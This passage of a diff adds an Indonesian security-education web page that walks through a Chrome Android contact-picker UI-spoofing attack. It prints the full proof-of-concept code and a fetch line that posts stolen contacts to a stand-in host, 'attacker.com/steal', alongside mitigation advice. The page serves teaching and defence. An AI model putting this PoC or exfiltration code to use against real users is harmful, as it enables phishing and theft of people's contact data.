+                  <div class="browser-bar">
+                    <div class="url-box malicious">g00gle-login.com</div>
+                  </div>
+                  <div class="page-content" style="position:relative;">
+                    <div style="font-size:32px;margin-bottom:12px;">🔄</div>
+                    <div class="page-title-sm">Memuat halaman...</div>
+                    <div class="page-sub-sm">Mohon tunggu sebentar</div>
+                    <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:60px;height:60px;border-radius:50%;background:rgba(232,64,64,0.18);border:2px solid rgba(232,64,64,0.4);animation:pulse 0.6s ease-out forwards;"></div>
+                  </div>
+                </div>
+              </div>
+              <div class="state-label">👆 Korban mengklik layar</div>
+            </div>
+            <div class="sim-right">
+              <div class="explain-box">
+                <p>
+                  <strong>Langkah 2: Klik memicu serangan</strong><br><br>
+                  Korban mengetuk layar — mungkin karena mengira halaman perlu diklik untuk lanjut.<br><br>
+                  Satu ketukan ini memicu dua aksi sekaligus:
+                  <br>① <code>navigator.contacts.select()</code> dipanggil
+                  <br>② <code>window.open("google.com")</code> dijalankan tanpa menunggu ①
+                </p>
+              </div>
+              <div class="code-wrap" style="margin:0">
+                <div class="code-bar">
+                  <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+                  <div class="code-filename">dua aksi bersamaan</div>
+                </div>
+                <pre style="padding:14px 16px;font-size:11.5px;"><span class="kw">onclick</span> = <span class="kw">async</span> () => {
+<span class="hl">  <span class="cmt">// ① tidak di-await!</span>
+  (<span class="kw">async</span> () => {
+    <span class="kw">await</span> <span class="fn">navigator.contacts.select</span>(...);
+  })();</span>
+<span class="hl-amber">  <span class="cmt">// ② langsung jalan</span>
+  <span class="fn">open</span>(<span class="str">"https://google.com"</span>);</span>
+};</pre>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- STEP 3: Dialog di atas Google -->
+        <div class="sim-area sim-state" id="state3">
+          <div class="sim-layout">
+            <div>
+              <div class="phone-frame">
+                <div class="phone-notch"><div class="phone-notch-pill"></div></div>
+                <div class="phone-screen" style="position:relative;">
+                  <div class="phone-status" style="background:#f8f8f8;"><span>9:41</span><span>●●● 100%</span></div>
+                  <div class="browser-bar">
+                    <div class="url-box">google.com</div>
+                  </div>
+                  <div class="page-content google-page">
+                    <div class="google-logo-fake">
+                      <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+                    </div>
+                    <div class="google-search-bar">🔍 Cari di Google...</div>
+                    <div style="font-size:9px;color:#aaa;">Google Penelusuran</div>
+                  </div>
+                  <div class="dialog-overlay">
+                    <div class="dialog-box">
+                      <div class="dialog-handle"></div>
+                      <div class="dialog-origin-text">g00gle-login.com meminta akses:</div>
+                      <div class="dialog-heading">Pilih kontak yang ingin dibagikan</div>
+                      <div class="contact-item">
+                        <div class="contact-avatar" style="background:#4285F4;">BS</div>
+                        <div class="contact-info">
+                          <div class="contact-name">Budi Santoso</div>
+                          <div class="contact-detail">0812-3456-7890</div>
+                        </div>
+                      </div>
+                      <div class="contact-item">
+                        <div class="contact-avatar" style="background:#34A853;">SR</div>
+                        <div class="contact-info">
+                          <div class="contact-name">Siti Rahayu</div>
+                          <div class="contact-detail">siti@email.com</div>
+                        </div>
+                      </div>
+                      <div class="dialog-check">
+                        <div class="check-box">✓</div>
+                        <span>2 kontak dipilih</span>
+                      </div>
+                      <div class="dialog-btns">
+                        <button class="dbtn dbtn-deny">Tolak</button>
+                        <button class="dbtn dbtn-allow">Izinkan</button>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="state-label" style="color:#e84040;">⚠ Dialog penyerang di atas Google!</div>
+            </div>
+            <div class="sim-right">
+              <div class="explain-box">
+                <p>
+                  <strong>Langkah 3: Spoofing berhasil</strong><br><br>
+                  Yang korban lihat: halaman Google di balik dialog kontak.<br><br>
+                  Teks kecil <code>g00gle-login.com</code> ada di sana, tapi korban fokus pada logo Google di belakang — dan mengira <strong>Google-lah yang meminta izin</strong>.<br><br>
+                  Ini adalah inti dari serangan UI Spoofing.
+                </p>
+              </div>
+              <div class="callout callout-red" style="margin:0">
+                <div class="callout-icon">🎯</div>
+                <div class="callout-body">
+                  <div class="callout-title">Mengapa efektif?</div>
+                  <p>Chrome tidak otomatis menutup dialog kontak ketika terjadi navigasi lintas-origin. Seharusnya, dialog harus dibatalkan saat <code>google.com</code> dibuka.</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- STEP 4: Data bocor -->
+        <div class="sim-area sim-state" id="state4">
+          <div class="sim-layout">
+            <div>
+              <div class="phone-frame">
+                <div class="phone-notch"><div class="phone-notch-pill"></div></div>
+                <div class="phone-screen">
+                  <div class="phone-status"><span>9:41</span><span>●●● 100%</span></div>
+                  <div class="browser-bar">
+                    <div class="url-box">google.com</div>
+                  </div>
+                  <div class="page-content google-page">
+                    <div class="google-logo-fake">
+                      <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+                    </div>
+                    <div class="google-search-bar">🔍 Cari di Google...</div>
+                  </div>
+                </div>
+              </div>
+              <div class="state-label">✅ Korban mengira selesai, Google terbuka normal</div>
+            </div>
+            <div class="sim-right">
+              <div class="explain-box">
+                <p>
+                  <strong>Langkah 4: Data dikirim diam-diam</strong><br><br>
+                  Setelah korban menekan "Izinkan", browser mengembalikan data kontak ke situs penyerang.<br><br>
+                  Di PoC asli, data langsung di-fetch ke server. Korban tidak menyadari apa pun — halaman Google tetap terbuka normal.
+                </p>
+              </div>
+              <div class="code-wrap" style="margin:0">
+                <div class="code-bar">
+                  <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+                  <div class="code-filename">data dikirim ke server</div>
+                </div>
+                <pre style="padding:14px 16px;font-size:11.5px;"><span class="kw">let</span> contacts = <span class="kw">await</span>
+  <span class="fn">navigator.contacts.select</span>(
+    [<span class="str">"name"</span>, <span class="str">"tel"</span>, <span class="str">"email"</span>]
+  );
+
+<span class="cmt">// kirim ke server penyerang</span>
+<span class="kw">await</span> <span class="fn">fetch</span>(
+  <span class="str">"https://attacker.com/steal"</span>,
+  { method: <span class="str">"POST"</span>,
+    body: <span class="fn">JSON.stringify</span>(contacts) }
+);</pre>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- STEP 5: Server penyerang -->
+        <div class="sim-area sim-state" id="state5">
+          <div class="sim-layout" style="align-items:center;">
+            <div style="text-align:center;">
+              <div style="font-size:13px;color:var(--text3);font-family:var(--display);font-weight:600;margin-bottom:12px;text-transform:uppercase;letter-spacing:0.08em;">Server Penyerang</div>
+              <div class="server-terminal" id="terminalOutput">
+                <div class="t-dim">$ attacker-server v1.0 listening...</div>
+                <div class="t-dim">$ port 443 — endpoint /steal</div>
+                <div style="margin-top:8px;" class="t-dim">─────────────────────────</div>
+              </div>
+              <div id="terminalStatus" style="margin-top:10px;font-family:var(--display);font-size:12px;font-weight:600;color:var(--text3);">Menunggu data masuk...</div>
+            </div>
+            <div class="sim-right">
+              <div class="explain-box">
+                <p>
+                  <strong>Langkah 5: Data tiba di server penyerang</strong><br><br>
+                  Semua data kontak yang dipilih korban tiba di server penyerang dalam hitungan milidetik.<br><br>
+                  Data ini bisa digunakan untuk:
+                  <br>• Serangan phishing bertarget
+                  <br>• Penipuan via telepon (vishing)
+                  <br>• Dijual ke pihak ketiga
+                  <br>• Social engineering terhadap kontak korban
+                </p>
+              </div>
+              <div class="callout callout-red" style="margin:0">
+                <div class="callout-icon">💀</div>
+                <div class="callout-body">
+                  <div class="callout-title">Dampak nyata</div>
+                  <p>Bukan hanya data korban yang bocor — data semua kontak di buku telepon mereka ikut terancam.</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Navigation -->
+        <div class="sim-nav">
+          <button class="nav-btn" id="btnPrev" onclick="prevStep()" disabled>← Sebelumnya</button>
+          <span id="stepCounter" style="font-family:var(--display);font-size:13px;color:var(--text3);align-self:center;">Langkah 1 dari 5</span>
+          <button class="nav-btn primary" id="btnNext" onclick="nextStep()">Selanjutnya →</button>
+        </div>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- SECTION 4: Analisis Kode -->
+  <section class="section">
+    <div class="section-label">04 — Analisis Teknis</div>
+    <h2>Bedah Kode PoC</h2>
+    <p>Hanya 25 baris kode — tapi mengandung dua trik teknis yang cerdik. Berikut kode asli PoC dengan anotasi lengkap:</p>
+
+    <div class="code-wrap">
+      <div class="code-bar">
+        <div class="code-dots"><div class="cd cd-r"></div><div class="cd cd-y"></div><div class="cd cd-g"></div></div>
+        <div class="code-filename">contact-poc.html — kode asli dengan anotasi</div>
+      </div>
+      <pre><span class="tag">&lt;!DOCTYPE html&gt;
+&lt;html</span> <span class="attr">lang</span>=<span class="str">"en"</span><span class="tag">&gt;
+&lt;head&gt;
+  &lt;title&gt;</span>PoC<span class="tag">&lt;/title&gt;
+  &lt;script&gt;</span>
+
+<span class="hl">    <span class="cmt">// [A] listener ke SELURUH halaman — satu klik = pemicu</span>
+    <span class="kw">onclick</span> = <span class="kw">async</span> () => {</span>
+
+<span class="hl">      <span class="cmt">// [B] IIFE async — TIDAK di-await dari luar</span>
+      (<span class="kw">async</span> () => {
+<span class="hl">          <span class="cmt">// [C] API resmi — meminta nama kontak</span>
+          <span class="kw">let</span> contacts = <span class="kw">await</span> <span class="fn">navigator.contacts.select</span>(
+            [<span class="str">"name"</span>], {}
+          );</span>
+          <span class="cmt">// tampilkan (aslinya: kirim ke server)</span>
+          document.<span class="fn">write</span>(`Leaked: ${contacts[0][<span class="str">"name"</span>]}`);
+      })(); <span class="cmt">// ← IIFE langsung jalan</span></span>
+
+<span class="hl-amber">      <span class="cmt">// [D] Ini langsung dieksekusi tanpa menunggu [B]</span>
+      <span class="fn">open</span>(<span class="str">"https://www.google.com"</span>, <span class="str">"PoC"</span>, <span class="str">"_blank"</span>);</span>
+    };
+
+  <span class="tag">&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;center&gt;&lt;h1&gt;</span>Click anywhere...<span class="tag">&lt;/h1&gt;&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;</span></pre>
+    </div>
+
+    <div class="ann-list">
+      <div class="ann ann-red-bg">
+        <div class="ann-letter">A</div>
+        <div class="ann-content">
+          <div class="ann-head">Global onclick listener</div>
+          <p><code>onclick</code> dipasang langsung ke <code>window</code> — bukan ke elemen tertentu. Artinya klik di mana saja di halaman sudah memicu serangan. Tidak perlu tombol, link, atau interaksi khusus.</p>
+        </div>
+      </div>
+      <div class="ann ann-red-bg">
+        <div class="ann-letter">B</div>
+        <div class="ann-content">
+          <div class="ann-head">IIFE tidak di-await — kunci race condition</div>
+          <p>Fungsi <code>async</code> di dalam dibungkus IIFE dan langsung dijalankan, tapi TIDAK di-<code>await</code> dari fungsi luar. Ini membuat eksekusi berlanjut ke baris berikutnya <em>tanpa menunggu</em> dialog kontak selesai — sehingga <code>open()</code> jalan bersamaan.</p>
+        </div>
+      </div>
+      <div class="ann ann-red-bg">
+        <div class="ann-letter">C</div>
+        <div class="ann-content">
+          <div class="ann-head">navigator.contacts.select() — API resmi</div>
+          <p>Ini adalah API browser yang sah. Parameter <code>["name"]</code> di sini hanya meminta nama — tapi bisa diperluas ke <code>["name", "tel", "email", "address"]</code> untuk mencuri lebih banyak data sekaligus.</p>
+        </div>
+      </div>
+      <div class="ann ann-amber-bg">
+        <div class="ann-letter">D</div>
+        <div class="ann-content">
+          <div class="ann-head">window.open() — senjata spoofing</div>
+          <p>Membuka <code>google.com</code> tepat saat dialog kontak muncul. Chrome tidak membatalkan dialog meski terjadi navigasi lintas-origin. Hasilnya: dialog penyerang tampil di atas halaman Google — spoofing berhasil.</p>
+        </div>
+      </div>
+      <div class="ann ann-blue-bg">
+        <div class="ann-letter">i</div>
+        <div class="ann-content">
+          <div class="ann-head">Versi serangan nyata</div>
+          <p>Di PoC ini, data ditampilkan via <code>document.write()</code> hanya untuk demo. Penyerang nyata akan mengganti baris itu dengan <code>fetch("https://attacker.com/steal", {method:"POST", body: JSON.stringify(contacts)})</code> — mengirim data diam-diam ke server mereka.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <hr class="divider">
+
+  <!-- SECTION 5: Dampak -->
+  <section class="section">
+    <div class="section-label">05 — Dampak & Risiko</div>
+    <h2>Data Apa yang Bisa Dicuri?</h2>
+
+    <div class="data-table-wrap">
+      <table class="data-table">
+        <thead>
+          <tr>
+            <th>Data</th>
+            <th>Parameter API</th>
+            <th>Risiko</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>Nama lengkap kontak</td>
+            <td><code style="font-family:var(--mono);font-size:12px;color:var(--amber);">"name"</code></td>
+            <td>Digunakan untuk social engineering dan targeted phishing</td>
+          </tr>
+          <tr>
+            <td>Nomor telepon</td>
+            <td><code style="font-family:var(--mono);font-size:12px;color:var(--amber);">"tel"</code></td>
+            <td>Serangan vishing, SMS phishing, SIM swap</td>
+          </tr>
+          <tr>
+            <td>Alamat email</td>
+            <td><code style="font-family:var(--mono);font-size:12px;color:var(--amber);">"email"</code></td>
+            <td>Credential stuffing, email phishing</td>
+          </tr>
+          <tr>
+            <td>Alamat fisik</td>
+            <td><code style="font-family:var(--mono);font-size:12px;color:var(--amber);">"address"</code></td>
+            <td>Penipuan paket, stalking, penipuan identitas</td>
+          </tr>
+          <tr>
+            <td>Nama organisasi</td>
+            <td><code style="font-family:var(--mono);font-size:12px;color:var(--amber);">"organization"</code></td>
+            <td>Business email compromise, targeted corporate attack</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="callout callout-red">
+      <div class="callout-icon">🚨</div>
+      <div class="callout-body">
+        <div class="callout-title">Ingat: Bukan hanya data kamu yang bocor</div>
+        <p>Korban memilih dari buku kontak mereka — artinya data orang-orang lain (keluarga, rekan kerja, teman) juga ikut bocor tanpa sepengetahuan atau persetujuan mereka.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- SECTION 6: Cara Melindungi Diri -->
+  <section class="section">
+    <div class="section-label">06 — Mitigasi</div>
+    <h2>Cara Melindungi Diri</h2>
+
+    <div class="tips-grid">
+      <div class="tip-card">
+        <div class="tip-icon">🔍</div>
+        <div class="tip-title">Baca nama situs di dialog</div>
+        <div class="tip-text">Selalu perhatikan teks kecil di atas dialog izin — bukan hanya tampilan halaman di belakangnya. Jika nama situsnya tidak kamu kenal, tekan Tolak.</div>
+      </div>
+      <div class="tip-card">
+        <div class="tip-icon">⚠️</div>
+        <div class="tip-title">Waspadai domain lookalike</div>
+        <div class="tip-text">Domain seperti <code style="font-family:var(--mono);font-size:11px;">g00gle.com</code>, <code style="font-family:var(--mono);font-size:11px;">paypa1.com</code> adalah tanda bahaya. Periksa URL di bar browser sebelum mempercayai halaman.</div>
+      </div>
+      <div class="tip-card">
+        <div class="tip-icon">👆</div>
+        <div class="tip-title">Hati-hati di situs tidak dikenal</div>
+        <div class="tip-text">Satu klik sudah cukup memicu serangan ini. Jika kamu tidak mengenal situsnya, jangan klik area manapun — langsung tutup tab.</div>
+      </div>
+      <div class="tip-card">
+        <div class="tip-icon">🔄</div>
+        <div class="tip-title">Update Chrome secara rutin</div>
+        <div class="tip-text">Google aktif memperbaiki kerentanan seperti ini. Pastikan Chrome kamu selalu versi terbaru lewat Play Store atau pengaturan browser.</div>
+      </div>
+      <div class="tip-card">
+        <div class="tip-icon">❌</div>
+        <div class="tip-title">Tolak izin yang tidak diminta</div>
+        <div class="tip-text">Jika kamu tidak sedang menggunakan fitur yang butuh akses kontak, tolak semua dialog izin kontak — apapun yang tampak di belakang dialog itu.</div>
+      </div>
+      <div class="tip-card">
+        <div class="tip-icon">🏢</div>
+        <div class="tip-title">Untuk pengembang</div>
+        <div class="tip-text">Browser seharusnya menutup dialog <code style="font-family:var(--mono);font-size:11px;">navigator.contacts.select()</code> secara otomatis ketika terjadi navigasi lintas-origin di context yang sama.</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- SECTION 7: Referensi Teknis -->
+  <section class="section">
+    <div class="section-label">07 — Referensi</div>
+    <h2>Detail Teknis & Referensi</h2>
+
+    <div class="callout callout-blue">
+      <div class="callout-icon">📋</div>
+      <div class="callout-body">
+        <div class="callout-title">Chromium Issue Tracker</div>
+        <p>Kerentanan serupa dilaporkan di <strong>issues.chromium.org/issues/40057597</strong>. Kerentanan ini melibatkan pemanggilan <code>navigator.contacts.select()</code> bersamaan dengan membuka jendela lintas-origin yang menyebabkan dialog izin tampil di atas halaman yang tidak memintanya.</p>
+      </div>
+    </div>
+
+    <div class="data-table-wrap">
+      <table class="data-table">
+        <thead>
+          <tr><th>Detail</th><th>Nilai</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Platform terdampak</td><td>Chrome Android (sebelum patch)</td></tr>
+          <tr><td>Tipe serangan</td><td>UI Spoofing / Clickjacking via Cross-Origin Navigation</td></tr>
+          <tr><td>API yang disalahgunakan</td><td>Contact Picker API (navigator.contacts.select)</td></tr>
+          <tr><td>Syarat serangan</td><td>Satu gesture pengguna (tap/click) pada halaman penyerang</td></tr>
+          <tr><td>Kondisi paling efektif</td><td>Pengguna belum pernah memberi izin Kontak ke Chrome</td></tr>
+          <tr><td>Referensi serupa</td><td>Chromium Bug #40057597</td></tr>
+          <tr><td>Perbaikan yang tepat</td><td>Browser harus membatalkan dialog kontak saat navigasi lintas-origin</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+</div>
+
+<footer>
+  <p>Artikel ini dibuat untuk tujuan edukasi keamanan siber. Tidak ada data nyata yang diakses dalam pembuatan artikel ini.</p>
+  <a class="footer-ref" href="https://issues.chromium.org/issues/40057597" target="_blank">→ Chromium Issue #40057597</a>
+</footer>
+
+<style>
+@keyframes pulse {
+  0% { transform: translate(-50%,-50%) scale(0.5); opacity:1; }
+  100% { transform: translate(-50%,-50%) scale(2.5); opacity:0; }
+}
+</style>
+
+<script>
+  let currentStep = 1;
+  const totalSteps = 5;
+  let terminalStarted = false;
+
+  function updateUI() {
+    // hide all states
+    for (let i = 1; i <= totalSteps; i++) {
+      const el = document.getElementById('state' + i);
+      if (el) { el.classList.remove('active'); }
+    }
+    // show current
+    const cur = document.getElementById('state' + currentStep);
+    if (cur) cur.classList.add('active');
+
+    // update step buttons
+    const btns = document.querySelectorAll('.poc-step-btn');
+    btns.forEach((btn, idx) => {
+      btn.classList.remove('active', 'done');
+      if (idx + 1 === currentStep) btn.classList.add('active');
+      else if (idx + 1 < currentStep) btn.classList.add('done');
+    });
+
+    // update nav
+    document.getElementById('btnPrev').disabled = currentStep === 1;
+    const nextBtn = document.getElementById('btnNext');
+    if (currentStep === totalSteps) {
+      nextBtn.textContent = '↺ Mulai Ulang';
+      nextBtn.className = 'nav-btn success';
+    } else {
+      nextBtn.textContent = 'Selanjutnya →';
+      nextBtn.className = 'nav-btn primary';
+    }
+    document.getElementById('stepCounter').textContent = 'Langkah ' + currentStep + ' dari ' + totalSteps;
+
+    // trigger terminal on step 5
+    if (currentStep === 5 && !terminalStarted) {
+      terminalStarted = true;
+      startTerminal();
+    }
+  }
+
+  function nextStep() {
+    if (currentStep === totalSteps) {
+      currentStep = 1;
+      terminalStarted = false;
+      document.getElementById('terminalOutput').innerHTML =
+        '<div class="t-dim">$ attacker-server v1.0 listening...</div>' +
+        '<div class="t-dim">$ port 443 — endpoint /steal</div>' +
+        '<div style="margin-top:8px;" class="t-dim">─────────────────────────</div>';
+      document.getElementById('terminalStatus').textContent = 'Menunggu data masuk...';
+      document.getElementById('terminalStatus').style.color = 'var(--text3)';
+    } else {
+      currentStep++;
+    }
+    updateUI();
+  }
+
+  function prevStep() {
+    if (currentStep > 1) { currentStep--; updateUI(); }
+  }
+
+  function goStep(n) {
+    currentStep = n;
+    updateUI();
+  }
+
+  function startTerminal() {
+    const term = document.getElementById('terminalOutput');
+    const status = document.getElementById('terminalStatus');
+    const lines = [
+      { text: '$ [09:41:22] POST /steal — new connection', cls: 't-dim', delay: 800 },
+      { text: '$ victim_ip: 180.247.x.x (ID)', cls: 't-cyan', delay: 1200 },
+      { text: '', cls: '', delay: 1600 },
+      { text: '$ CONTACTS RECEIVED:', cls: 't-yellow', delay: 2000 },
+      { text: '  [0].name  → "Budi Santoso"', cls: 't-green', delay: 2400 },
+      { text: '  [0].tel   → "+6281234567890"', cls: 't-green', delay: 2700 },
+      { text: '  [1].name  → "Siti Rahayu"', cls: 't-green', delay: 3000 },
+      { text: '  [1].tel   → "+6285789012345"', cls: 't-green', delay: 3300 },
+      { text: '  [1].email → "siti@mail.com"', cls: 't-green', delay: 3600 },
+      { text: '', cls: '', delay: 3900 },
+      { text: '$ saved to /data/leaked_contacts.json', cls: 't-yellow', delay: 4200 },
+      { text: '$ 2 contacts exfiltrated ✓', cls: 't-red', delay: 4600 },
+    ];
+
+    lines.forEach(({ text, cls, delay }) => {
+      setTimeout(() => {
+        if (text === '') {
+          term.innerHTML += '<br>';
+        } else {
+          const div = document.createElement('div');
+          div.className = cls;
+          div.textContent = text;
+          term.appendChild(div);
+          term.scrollTop = term.scrollHeight;
+        }
+        if (delay === 4600) {
+          status.textContent = '2 kontak berhasil dicuri!';
+          status.style.color = 'var(--red)';
+        }
+      }, delay);
+    });
+  }
+
+  // init
+  updateUI();
+</script>
+</body>
+</html>
